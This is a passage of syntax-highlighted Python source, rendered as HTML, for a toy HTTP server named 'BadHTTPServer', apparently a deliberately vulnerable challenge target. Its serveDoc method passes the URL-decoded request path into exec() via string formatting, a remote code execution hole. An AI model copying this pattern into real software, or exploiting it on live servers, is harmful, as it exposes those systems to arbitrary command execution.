&lt;span class="code-line"&gt;        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sock&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;AF_INET&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SOCK_STREAM&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sock&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;setsockopt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SOL_SOCKET&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SO_REUSEADDR&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sock&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;bind&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;host&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;port&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;listen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sock&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;listen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="kc"&gt;True&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;client&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;address&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sock&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;accept&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;client&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;settimeout&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;60&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;threading&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Thread&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;target&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;listenToClient&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;client&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;address&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;start&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;listenToClient&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;client&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;address&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;size&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1024&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="kc"&gt;True&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                &lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;client&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recv&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;size&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                    &lt;span class="c1"&gt;# Set the response to echo back the recieved data&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                    &lt;span class="n"&gt;req&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Request&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;decode&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                    &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;handleRequest&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;req&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;client&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;address&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                    &lt;span class="n"&gt;client&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;shutdown&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                    &lt;span class="n"&gt;client&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                    &lt;span class="k"&gt;raise&lt;/span&gt; &lt;span class="n"&gt;error&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Client disconnected&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="k"&gt;except&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                &lt;span class="n"&gt;client&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="kc"&gt;False&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;handleRequest&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;conn&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;address&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;good&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  &lt;span class="c1"&gt;#            try:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                &lt;span class="c1"&gt;# print(str(request.method) + &amp;quot; &amp;quot; + str(request.doc), end=&amp;#39; &amp;#39;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                &lt;span class="c1"&gt;# print(&amp;quot;from {0}&amp;quot;.format(address[0]))&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  &lt;span class="c1"&gt;#            except Exception as e:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  &lt;span class="c1"&gt;#                print(e)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;document&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;serveDoc&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;doc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;DOC_ROOT&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;statusNum&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;document&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;status&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;document&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;serveDoc&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/errors/400.html&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;DOC_ROOT&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;statusNum&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;400&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;body&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;document&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;body&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;statusCode&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;CODES&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;statusNum&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;dateSent&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;server&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;BadHTTPServer&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;modified&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;length&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;body&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;contentType&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;document&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;mime&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="c1"&gt;# Try and identify MIME type from string&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;connectionType&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Closed&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;resp&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Response&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;statusNum&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;statusNum&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;statusCode&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;statusCode&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;dateSent&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;dateSent&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;server&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;server&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;modified&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;modified&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;length&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;length&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;contentType&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;contentType&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;connectionType&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;connectionType&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;body&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;body&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;resp&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;stringResponse&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;conn&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;encode&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;serveDoc&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;docRoot&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;path&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;urllib&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;parse&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;unquote&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;info&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;output = &amp;#39;Document: &lt;/span&gt;&lt;span class="si"&gt;{}&lt;/span&gt;&lt;span class="s2"&gt;&amp;#39;&amp;quot;&lt;/span&gt; &lt;span class="c1"&gt;# Keep the output for later debug&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;exec&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;info&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="c1"&gt;# This is how you do string formatting, right?&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;cwd&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;dirname&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;realpath&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="vm"&gt;__file__&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;docRoot&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cwd&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;docRoot&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;path&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;/&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                &lt;span class="n"&gt;path&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;/index.html&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;requested&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;docRoot&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;:])&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;isfile&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;requested&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                &lt;span class="n"&gt;mime&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;mimetypes&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;guess_type&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;requested&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                &lt;span class="n"&gt;mime&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;mime&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;mime&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="kc"&gt;None&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;text/html&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                &lt;span class="n"&gt;mime&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;MIMES&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;requested&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;.&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]]&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                &lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                    &lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;requested&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;r&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                        &lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                &lt;span class="k"&gt;except&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                    &lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;requested&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;rb&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                        &lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                &lt;span class="n"&gt;status&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;200&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
